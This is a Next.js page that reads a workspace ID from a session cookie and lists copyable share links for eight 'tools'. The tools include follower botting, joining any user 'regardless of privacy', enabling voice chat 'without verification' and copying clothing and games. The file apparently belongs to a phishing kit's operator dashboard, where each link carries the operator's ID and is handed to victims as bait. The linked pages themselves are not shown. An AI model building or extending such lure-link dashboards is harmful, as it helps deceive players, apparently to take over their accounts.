'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'
import { LinkIcon, Copy, ExternalLink, Check, Globe, Sparkles } from 'lucide-react'

interface Tool {
  name: string
  icon: string
  path: string
  desc: string
  color: string
}

const TOOLS: Tool[] = [
  { name: 'Copy Clothes', icon: '👕', path: 'Copy-Clothes', desc: 'Copy any clothing item instantly', color: 'from-red-500 to-orange-500' },
  { name: 'Copy Games', icon: '🎮', path: 'Copy-Games', desc: 'Download any game and assets', color: 'from-green-500 to-emerald-500' },
  { name: 'Bot Followers', icon: '👤', path: 'Bot-Followers', desc: 'Generate followers for any account', color: 'from-blue-500 to-cyan-500' },
  { name: 'Group Botter', icon: '👥', path: 'Group-Botter', desc: 'Bot members to any group', color: 'from-purple-500 to-pink-500' },
  { name: 'VC Enabler', icon: '🎤', path: 'Vc-Enabler', desc: 'Enable voice chat without verification', color: 'from-pink-500 to-rose-500' },
  { name: 'Join Anyone', icon: '🔓', path: 'Join-Anyone', desc: 'Join any user regardless of privacy', color: 'from-amber-500 to-yellow-500' },
  { name: 'Enable Shaders', icon: '✨', path: 'Enable-Shaders', desc: 'Enable advanced graphics options', color: 'from-cyan-500 to-teal-500' },
  { name: 'Limited Checker', icon: '🔍', path: 'Limited-Checker', desc: 'Check any limited item value', color: 'from-emerald-500 to-green-500' }
]

export default function LinksPage() {
  const [directory, setDirectory] = useState<string>('')
  const [copied, setCopied] = useState<string | null>(null)

  useEffect(() => {
    try {
      const cookies = document.cookie.split(';')
      for (const c of cookies) {
        if (c.trim().startsWith('rc_session=')) {
          const val = decodeURIComponent(c.trim().split('=')[1])
          const parts = val.split(':')
          const decrypted = atob(parts[1] || '')
          const session = JSON.parse(decrypted)
          setDirectory(session.directory)
          break
        }
      }
    } catch {}
  }, [])

  const copyLink = async (path: string): Promise<void> => {
    const url = `${window.location.origin}/${path}/${directory}`
    await navigator.clipboard.writeText(url)
    setCopied(path)
    setTimeout(() => setCopied(null), 2000)
  }

  const openLink = (path: string): void => {
    window.open(`/${path}/${directory}`, '_blank')
  }

  if (!directory) {
    return (
      <div className="min-h-screen bg-[#09090b] flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-16 h-16 rounded-full border-4 border-blue-500/20 border-t-blue-500 animate-spin mx-auto mb-4" />
          <p className="text-gray-400">Loading workspace...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#09090b] p-4 pb-24">
      <div className="max-w-2xl mx-auto">
        {/* Header */}
        <div className="flex items-center gap-3 mb-8">
          <div className="w-10 h-10 bg-gradient-to-br from-cyan-500 to-blue-500 rounded-xl flex items-center justify-center">
            <LinkIcon size={20} />
          </div>
          <div>
            <h1 className="text-2xl font-bold">Tool Links</h1>
            <p className="text-xs text-gray-500">Share links to your tools</p>
          </div>
        </div>

        {/* Workspace Info */}
        <div className="bg-[#111] border border-[#27272a] rounded-xl p-4 mb-6 flex items-center gap-3">
          <Globe size={18} className="text-gray-400" />
          <p className="text-sm text-gray-300">
            Workspace: <span className="font-mono font-semibold text-white">{directory}</span>
          </p>
        </div>

        {/* Tools List */}
        <div className="space-y-4">
          {TOOLS.map((tool: Tool) => (
            <div key={tool.path} className="bg-[#111] border border-[#27272a] rounded-2xl p-5 hover:border-[#3f3f46] transition-all group">
              <div className="flex items-start gap-4 mb-4">
                <div className={`w-14 h-14 rounded-xl bg-gradient-to-br ${tool.color} flex items-center justify-center text-2xl shadow-lg group-hover:scale-110 transition-transform`}>
                  {tool.icon}
                </div>
                <div className="flex-1">
                  <h3 className="font-semibold text-lg text-white group-hover:text-blue-400 transition-colors">
                    {tool.name}
                  </h3>
                  <p className="text-sm text-gray-400">{tool.desc}</p>
                </div>
              </div>

              {/* URL Display */}
              <div className="bg-[#09090b] rounded-xl p-3 mb-4 flex items-center gap-2">
                <Globe size={14} className="text-gray-500 shrink-0" />
                <code className="text-sm text-gray-400 font-mono truncate flex-1">
                  {window.location.origin}/{tool.path}/{directory}
                </code>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <button
                  onClick={() => copyLink(tool.path)}
                  className="flex-1 flex items-center justify-center gap-2 bg-gradient-to-r from-blue-500 to-purple-600 text-white rounded-xl py-3 text-sm font-medium hover:from-blue-600 hover:to-purple-700 transition-all"
                >
                  {copied === tool.path ? (
                    <>
                      <Check size={16} />
                      Copied!
                    </>
                  ) : (
                    <>
                      <Copy size={16} />
                      Copy Link
                    </>
                  )}
                </button>
                <button
                  onClick={() => openLink(tool.path)}
                  className="flex-1 flex items-center justify-center gap-2 bg-[#18181b] border border-[#27272a] text-white rounded-xl py-3 text-sm font-medium hover:bg-[#27272a] transition-all"
                >
                  <ExternalLink size={16} />
                  Open
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
